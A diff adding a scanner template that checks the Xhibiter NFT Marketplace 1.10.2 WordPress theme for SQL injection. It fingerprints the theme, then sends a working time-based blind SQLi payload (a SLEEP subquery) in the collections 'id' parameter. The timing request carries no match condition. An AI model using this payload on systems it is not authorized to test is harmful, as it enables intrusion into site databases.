@@ -1,0 +1,28 @@
+id: xhibiter-nft-sqli
+brief:
+    title: Xhibiter NFT Marketplace 1.10.2 - SQL Injection
+    by: ProjectDiscoveryAI
+    level: high
+    about: The Xhibiter NFT Marketplace version 1.10.2 is vulnerable to a SQL Injection vulnerability. This allows an attacker to manipulate SQL queries by injecting malicious SQL code through vulnerable inpu...
+    label:
+        - xhibiter
+        - sqli
+        - time-based-sqli
+        - wordpress
+        - wp-theme
+        - xhibiter
+        - nft
+        - vuln
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/'
+      signs:
+        - "on": word
+          has:
+            - /wp-content/themes/xhibiter/
+          in: body
+    - verb: GET
+      to:
+        - '{{BaseURL}}/collections?id=2''+AND+(SELECT+1492+FROM+(SELECT(SLEEP(7)))HsLV)+AND+''KEOa''=''KEOa'
+      signs: []
